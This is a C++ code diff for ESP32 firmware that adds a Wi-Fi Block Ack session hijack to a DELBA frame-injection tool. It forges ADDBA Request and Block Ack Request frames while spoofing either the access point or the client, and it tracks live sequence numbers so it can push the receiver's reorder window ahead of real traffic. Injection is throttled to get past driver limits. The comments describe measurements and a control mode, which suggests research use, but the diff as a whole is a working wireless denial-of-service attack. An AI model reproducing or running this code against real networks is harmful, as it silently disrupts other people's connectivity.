@@ -76,8 +76,40 @@ int s_cursor;
 
 struct client_t {
     uint8_t mac[6];
-    uint8_t tids;  // bitmap of TIDs announced by this client
+    uint8_t tids;    // bitmap of TIDs announced by this client
+    uint16_t sn[2];  // highest SN seen per direction: 0 = AP->STA, 1 = STA->AP
+    uint16_t aim[2]; // SSN we last planted for that direction
 };
+
+// BA-session hijack state (DELBA -> forged ADDBA -> BAR).
+//   dir 0 = downlink: we pretend to be the AP, so the *client's* reorder window
+//           (WinStartB) is what gets moved.
+//   dir 1 = uplink:   we pretend to be the client, so the *AP's* window moves.
+bool s_ba_mode = false;
+uint16_t s_ssn_step = 512;  // how far ahead of the live SN to plant the window
+uint16_t s_last_ssn;
+uint32_t s_ba_round;
+uint32_t s_ba_addba_frames;
+uint32_t s_ba_bar_frames;
+uint32_t s_ba_delba_frames;
+uint32_t s_ba_errors;      // frames the driver refused
+int32_t s_ba_last_error;   // last esp_err_t from esp_wifi_80211_tx
+const uint32_t kBaRoundMs = 40;   // one client per tick
+const uint32_t kBaDelbaEvery = 5; // DELBA cadence (rounds): clean slate + preempt
+const uint32_t kBaAddbaEvery = 25;  // ADDBA cadence (rounds): plant the window
+const uint8_t kBaBufSize = 0;       // buffer size field 0 = 1 buffer (smallest)
+// Injection budget. Each forged frame without a peer ACK occupies the driver's
+// TX path for a while; firing the whole (client, TID, direction) matrix at once
+// just returns ESP_ERR_NO_MEM (measured: 1559 refusals in 15 s). So a round
+// sends at most this many frames and stops at the first refusal.
+const uint32_t kBaFramesPerRound = 4;
+uint32_t s_ba_pause_until;
+// One-shot mode: send a couple of forged ADDBA frames (plant the window) and then
+// stop transmitting entirely. Everything measured afterwards is *not* airtime
+// starvation, which is the only way to tell a reorder-window hijack apart from a
+// plain injection flood.
+bool s_ba_oneshot;
+uint32_t s_ba_plant_frames;
 
 client_t s_clients[kMaxClients];
 int s_client_count;
@@ -198,6 +230,144 @@ uint8_t sweep_mask(const client_t* c) {
     return c->tids != 0 ? c->tids : 0xFF;  // nothing learned yet: try every TID
 }
 
+// ADDBA Request: 24 B header + category(3) + action(0) + dialog token +
+// Block Ack Parameter Set + Block Ack Timeout + Block Ack Starting Sequence
+// Control. The SSN field is the whole point: a recipient initialises WinStartB
+// from it (802.11-2020 10.25.6.6), so a value far ahead of the live traffic
+// plants the window where real frames can never reach it.
+size_t build_addba_req(uint8_t* frame, const uint8_t da[6], const uint8_t sa[6], uint8_t tid,
+                       uint16_t ssn, uint8_t dialog) {
+    memset(frame, 0, 40);
+    frame[0] = 0xD0;  // management, subtype 13 = action
+    frame[1] = 0x00;
+    memcpy(frame + 4, da, 6);
+    memcpy(frame + 10, sa, 6);
+    memcpy(frame + 16, s_bssid, 6);
+    frame[22] = kSeqCtrlHigh;
+    frame[23] = kSeqCtrlLow;
+    frame[24] = 3;  // category: block ack
+    frame[25] = 0;  // action: ADDBA request
+    frame[26] = dialog;
+    const uint16_t params = (uint16_t)(((tid & 0x0F) << 2) | ((kBaBufSize & 0x3FF) << 6) | 0x0002);
+    frame[27] = (uint8_t)(params & 0xFF);
+    frame[28] = (uint8_t)(params >> 8);
+    frame[29] = 0;  // timeout 0
+    frame[30] = 0;
+    const uint16_t ssc = (uint16_t)((ssn & 0x0FFF) << 4);
+    frame[31] = (uint8_t)(ssc & 0xFF);
+    frame[32] = (uint8_t)(ssc >> 8);
+    return 33;
+}
+
+// Compressed Block Ack Request (control subtype 8): FC + duration + RA + TA +
+// BAR control + BAR information (starting sequence control).
+//   BAR control: bit1 multi-TID, bit2 compressed bitmap, bits4..7 TID
+//   BAR info   : bits 4..15 = starting sequence number, bits 0..3 = fragment 0
+size_t build_bar(uint8_t* frame, const uint8_t ra[6], const uint8_t ta[6], uint8_t tid,
+                 uint16_t ssn) {
+    memset(frame, 0, 24);
+    frame[0] = 0x84;  // control, subtype 8 = block ack request
+    frame[1] = 0x00;
+    memcpy(frame + 4, ra, 6);
+    memcpy(frame + 10, ta, 6);
+    const uint16_t ctrl = (uint16_t)(((tid & 0x0F) << 4) | 0x0004);
+    frame[16] = (uint8_t)(ctrl & 0xFF);
+    frame[17] = (uint8_t)(ctrl >> 8);
+    const uint16_t ssc = (uint16_t)((ssn & 0x0FFF) << 4);
+    frame[18] = (uint8_t)(ssc & 0xFF);
+    frame[19] = (uint8_t)(ssc >> 8);
+    return 20;
+}
+
+bool ba_tx(uint8_t* frame, size_t len, uint32_t* counter) {
+    const esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false);
+    if (err != ESP_OK) {
+        s_ba_errors++;
+        s_ba_last_error = (int32_t)err;
+        return false;
+    }
+    s_frames++;
+    if (counter != nullptr) {
+        (*counter)++;
+    }
+    return true;
+}
+
+// Tracks the highest SN a direction has reached, in 12-bit sequence space.
+void note_sn(client_t* c, int dir, uint16_t sn) {
+    if (((sn - c->sn[dir]) & 0x0FFF) < 0x0800) {
+        c->sn[dir] = (uint16_t)(sn & 0x0FFF);
+    }
+}
+
+// Plants the receive window of the peer that owns direction `dir`.
+bool ba_plant(int dir, const uint8_t mac[6], client_t* c, uint8_t tid) {
+    uint8_t frame[40];
+    const uint16_t aim = (uint16_t)((c->sn[dir] + s_ssn_step) & 0x0FFF);
+    c->aim[dir] = aim;
+    s_last_ssn = aim;
+    // dir 0: pretend to be the AP -> the client's WinStartB moves.
+    // dir 1: pretend to be the client -> the AP's WinStartB moves.
+    const size_t len = dir == 0
+                           ? build_addba_req(frame, mac, s_bssid, tid, aim, (uint8_t)(s_ba_round & 0xFF))
+                           : build_addba_req(frame, s_bssid, mac, tid, aim, (uint8_t)(s_ba_round & 0xFF));
+    return ba_tx(frame, len, &s_ba_addba_frames);
+}
+
+// Pushes that window forward again (and keeps it ahead as real SNs advance).
+bool ba_push(int dir, const uint8_t mac[6], client_t* c, uint8_t tid) {
+    uint8_t frame[24];
+    const uint16_t ssn = (uint16_t)((c->sn[dir] + s_ssn_step) & 0x0FFF);
+    s_last_ssn = ssn;
+    const size_t len = dir == 0 ? build_bar(frame, mac, s_bssid, tid, ssn)
+                                : build_bar(frame, s_bssid, mac, tid, ssn);
+    return ba_tx(frame, len, &s_ba_bar_frames);
+}
+
+// One (client, TID) slice of the BA-session hijack. Called from delba_step()
+// with one client per round.
+void ba_round_client(client_t* c) {
+    const uint8_t mask = sweep_mask(c);
+    uint32_t budget = kBaFramesPerRound;
+    for (int dir = 0; dir < 2; dir++) {
+        for (uint8_t tid = 0; tid < 8; tid++) {
+            if ((mask & (1u << tid)) == 0) {
+                continue;
+            }
+            if (budget == 0) {
+                return;
+            }
+            if (s_ba_round % kBaDelbaEvery == 0) {
+                // Step 1: tear the real session down, so the peer accepts our
+                // ADDBA instead of rejecting it as a duplicate session.
+                uint8_t frame[32];
+                const size_t len = dir == 0
+                                       ? build_delba(frame, c->mac, s_bssid, s_bssid, tid, true, s_reason)
+                                       : build_delba(frame, s_bssid, c->mac, s_bssid, tid, true, s_reason);
+                if (!ba_tx(frame, len, &s_ba_delba_frames)) {
+                    s_ba_pause_until = millis() + 5;
+                    return;
+                }
+                budget--;
+            }
+            if (s_ba_round % kBaAddbaEvery == 0 && budget > 0) {
+                // Step 2: recreate it ourselves with an SSN of our choosing.
+                if (!ba_plant(dir, c->mac, c, tid)) {
+                    s_ba_pause_until = millis() + 5;
+                    return;
+                }
+                budget--;
+            }
+            // Step 3: keep pushing WinStartB past the live sequence numbers.
+            if (!ba_push(dir, c->mac, c, tid)) {
+                s_ba_pause_until = millis() + 5;
+                return;
+            }
+            budget--;
+        }
+    }
+}
+
 }  // namespace
 
 bool delba_start(int index, uint16_t reason) {
@@ -235,6 +405,7 @@ bool delba_start(int index, uint16_t reason) {
 
 void delba_stop(void) {
     s_active = false;
+    s_ba_mode = false;
 }
 
 void delba_step(void) {
@@ -255,6 +426,61 @@ void delba_step(void) {
     }
 
     const uint32_t now = millis();
+
+    if (s_ba_mode) {
+        if (s_ba_oneshot) {
+            if (s_client_count == 0) {
+                return;  // wait until the sniffer knows a client
+            }
+            if ((int32_t)(now - s_ba_pause_until) < 0) {
+                return;
+            }
+            uint32_t budget = 8;
+            for (int i = 0; i < s_client_count && budget > 0; i++) {
+                client_t* c = &s_clients[i];
+                const uint8_t mask = sweep_mask(c);
+                for (int dir = 0; dir < 2; dir++) {
+                    for (uint8_t tid = 0; tid < 8; tid++) {
+                        if ((mask & (1u << tid)) == 0 || budget == 0) {
+                            continue;
+                        }
+                        if (!ba_plant(dir, c->mac, c, tid)) {
+                            s_ba_pause_until = millis() + 5;
+                            return;
+                        }
+                        s_ba_plant_frames++;
+                        budget--;
+                    }
+                }
+            }
+            s_ba_oneshot = false;  // window planted; stay silent from here on
+            return;
+        }
+        if (now - s_last_ms < kBaRoundMs) {
+            return;
+        }
+        if ((int32_t)(now - s_ba_pause_until) < 0) {
+            return;  // driver's TX queue is full: let it drain instead of hammering
+        }
+        s_last_ms = now;
+        s_ba_round++;
+        if (s_client_count == 0) {
+            // Nothing learned yet: a group BAR is the only thing we can aim at
+            // anybody (TID from the round counter, SSN = step size).
+            uint8_t frame[24];
+            const uint8_t tid = (uint8_t)(s_ba_round & 0x07);
+            const uint16_t ssn = (uint16_t)(((s_ba_round * s_ssn_step) + s_ssn_step) & 0x0FFF);
+            if (!ba_tx(frame, build_bar(frame, kBroadcast, s_bssid, tid, ssn), &s_ba_bar_frames)) {
+                s_ba_pause_until = millis() + 5;
+            }
+            return;
+        }
+        client_t* c = &s_clients[s_cursor];
+        s_cursor = (s_cursor + 1) % s_client_count;
+        ba_round_client(c);
+        return;
+    }
+
     if (now - s_last_ms < kSweepMs) {
         return;
     }
@@ -314,6 +540,11 @@ void delba_on_rx(const uint8_t* frame, uint16_t len, uint8_t type, uint8_t subty
     if (type == 2 && (subtype & 0x08) != 0 && len >= 26) {
         const uint8_t tid = (uint8_t)(frame[24] & 0x0F);
         s_clients[idx].tids = (uint8_t)(s_clients[idx].tids | (1u << (tid & 0x07)));
+        // Where is this direction's sequence number now? That is what the forged
+        // SSN has to stay ahead of.
+        const uint16_t seq = (uint16_t)(frame[22] | (frame[23] << 8));
+        const uint16_t sn = (uint16_t)((seq >> 4) & 0x0FFF);
+        note_sn(&s_clients[idx], memcmp(frame + 10, s_bssid, 6) == 0 ? 0 : 1, sn);
     }
 
     // Block Ack Request (control subtype 8) / Block Ack (control subtype 9):
@@ -390,6 +621,125 @@ void delba_selftest(void) {
     const size_t rlen = build_delba(frame, s_bssid, fake_sta, s_bssid, 0, true, s_reason);
     Serial.print("DELBATEST sta_to_ap hex=");
     for (size_t i = 0; i < rlen; i++) {
+        Serial.printf("%02X", frame[i]);
+    }
+    Serial.println();
+}
+
+bool delba_start_ba(int index, uint16_t ssn_step) {
+    if (ssn_step > 2047) {
+        return false;  // must stay inside the standard's WinStartB + 2^11 window
+    }
+    // step < 128 is the control condition: the SSN still gets written, but it
+    // stays inside the current reorder window, so nothing is pushed out.
+    if (!delba_start(index, kDefaultReason)) {
+        return false;
+    }
+    s_ba_mode = true;
+    s_ssn_step = ssn_step;
+    s_ba_round = 0;
+    s_ba_addba_frames = 0;
+    s_ba_bar_frames = 0;
+    s_ba_delba_frames = 0;
+    s_ba_errors = 0;
+    s_ba_last_error = 0;
+    s_last_ssn = 0;
+    return true;
+}
+
+bool delba_ba_mode(void) {
+    return s_ba_mode;
+}
+
+// Plant the reorder window(s) once and go silent (see s_ba_oneshot).
+bool delba_ba_plant_once(int index, uint16_t ssn_step) {
+    if (!delba_start_ba(index, ssn_step)) {
+        return false;
+    }
+    s_ba_oneshot = true;
+    s_ba_plant_frames = 0;
+    s_ba_round = 0;
+    return true;
+}
+
+uint32_t delba_ba_planted_frames(void) {
+    return s_ba_plant_frames;
+}
+
+uint32_t delba_ba_addba_frames(void) {
+    return s_ba_addba_frames;
+}
+
+uint32_t delba_ba_bar_frames(void) {
+    return s_ba_bar_frames;
+}
+
+uint32_t delba_ba_delba_frames(void) {
+    return s_ba_delba_frames;
+}
+
+uint16_t delba_ba_last_ssn(void) {
+    return s_last_ssn;
+}
+
+uint32_t delba_ba_errors(void) {
+    return s_ba_errors;
+}
+
+int32_t delba_ba_last_error(void) {
+    return s_ba_last_error;
+}
+
+// Debug helper: send one of each forged frame to `mac` and report the driver's
+// verdict for every one of them. This is how "why is baaddba still 0" gets
+// answered without guessing.
+void delba_ba_tx_probe(const uint8_t mac[6]) {
+    uint8_t frame[40];
+    s_ba_errors = 0;
+    s_ba_last_error = 0;
+
+    size_t len = build_delba(frame, mac, s_bssid, s_bssid, 0, true, s_reason);
+    esp_err_t e1 = esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false);
+
+    len = build_addba_req(frame, mac, s_bssid, 0, 1175, 1);
+    esp_err_t e2 = esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false);
+
+    len = build_bar(frame, mac, s_bssid, 0, 1175);
+    esp_err_t e3 = esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false);
+
+    Serial.printf("BATX delba(30B)=%d addba(33B)=%d bar(20B)=%d\n", (int)e1, (int)e2, (int)e3);
+}
+
+// Dumps one forged ADDBA Request and one forged BAR with decoded fields, so the
+// layout can be compared against 802.11-2020 / mac80211 without a second radio.
+void delba_ba_selftest(void) {
+    static const uint8_t placeholder[6] = {0x02, 0x11, 0x22, 0x33, 0x44, 0x55};
+    if (s_bssid[0] == 0 && s_bssid[1] == 0 && s_bssid[2] == 0) {
+        memcpy(s_bssid, placeholder, 6);
+    }
+    static const uint8_t fake_sta[6] = {0x02, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE};
+    uint8_t frame[40];
+    const uint16_t ssn = 1175;
+
+    const size_t alen = build_addba_req(frame, s_bssid, fake_sta, 5, ssn, 7);
+    const uint16_t params = (uint16_t)(frame[27] | (frame[28] << 8));
+    const uint16_t ssc = (uint16_t)(frame[31] | (frame[32] << 8));
+    Serial.printf("BATEST addba len=%u cat=%u act=%u tid=%u buf=%u ssn=%u hex=",
+                  (unsigned)alen, (unsigned)frame[24], (unsigned)frame[25],
+                  (unsigned)((params >> 2) & 0x0F), (unsigned)((params >> 6) & 0x3FF),
+                  (unsigned)(ssc >> 4));
+    for (size_t i = 0; i < alen; i++) {
+        Serial.printf("%02X", frame[i]);
+    }
+    Serial.println();
+
+    const size_t blen = build_bar(frame, s_bssid, fake_sta, 5, ssn);
+    const uint16_t ctrl = (uint16_t)(frame[16] | (frame[17] << 8));
+    const uint16_t bssc = (uint16_t)(frame[18] | (frame[19] << 8));
+    Serial.printf("BATEST bar len=%u subtype=%u tid=%u compressed=%u ssn=%u hex=",
+                  (unsigned)blen, (unsigned)((frame[0] >> 4) & 0x0F), (unsigned)((ctrl >> 4) & 0x0F),
+                  (unsigned)((ctrl >> 2) & 0x01), (unsigned)(bssc >> 4));
+    for (size_t i = 0; i < blen; i++) {
         Serial.printf("%02X", frame[i]);
     }
     Serial.println();
